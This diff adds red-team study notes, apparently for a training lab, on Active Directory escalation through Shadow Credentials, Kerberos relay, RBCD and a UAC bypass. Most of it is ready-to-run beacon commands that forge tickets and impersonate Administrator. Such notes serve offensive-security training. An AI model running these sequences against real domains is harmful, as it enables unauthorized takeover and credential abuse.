@@ -144,5 +144,70 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Evil
 
 **Shadow Credentials**
 
+Raw key data can be used rather than a certificate in a Key Trust model, this stores a client key on their own domain object in an attribute called msDS-KeyCredentialLink. If you can write to this attribute on a user or computer object you can obtain a TGT for that principal. A DACL-style abuse as with RBCD.
+Tools: [Whisker](https://github.com/eladshamir/Whisker)
+Steps:
+1. use whisker to identify any keys on the present target
+2. add a new key pair
+3. ask for TGT using rubeus
+4. can remove with whiskers clear command if needed
+
+```
+execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
+execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"<password>" /nowrap
+execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
+```
+
+**Kerberos Relay Attacks**
+
+Tools: [KrbRelay](https://github.com/cube0x0/KrbRelay), automated tool: [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
+
+krbrelay is too large on default so increase beacon task size
+```
+set tasks_max_size "2097152";
+```
+
+### RBCD with kerberos relay
+
+Tools: [SCMUACBypass](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)
+steps:
+1. add your own computer object to the domain and get it's SID
+2. find suitable port for OXID resolver to circumvent a check in the RPCSS, can use CheckPort.exe
+3. Run KerbRelay  
+    -spn is the target service to relay to.
+    -clsid represents RPC_C_IMP_LEVEL_IMPERSONATE.
+    -rbcd is the SID of the fake computer account.
+    -port is the port returned by CheckPort.
+5. verify that a new entry in the machines msDS-AllowedToActOnBehalfOfOtherIdentity
+6. now request TGT and perform an S4U to obtain a usable service ticket
+7. use SCMUACBypass to elevate
+
+```
+execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
+powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
+execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
+execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd <machine SID> -port 10
+powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j[...snip...]MuaW8= /ptt
+elevate svc-exe-krb tcp-local
+```
+
+### Shadow creds with kerberos relay
+
+The advantage of using shadow credentials over RBCD is that we don't need to add a fake computer to the domain.  
+1. First, verify that your machine account has nothing in its msDS-KeyCredentialLink attribute.
+2. run kerbreay with -shadowcred
+3. get aes ticket using rubeus
+4. s4u2self to obtain a HOST service ticket
+5. elevate
 
 
+```
+execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$
+execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"06ce8e51-a71a-4e0c-b8a3-992851ede95f" /enctype:aes256 /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt
+elevate svc-exe-krb tcp-local
+```
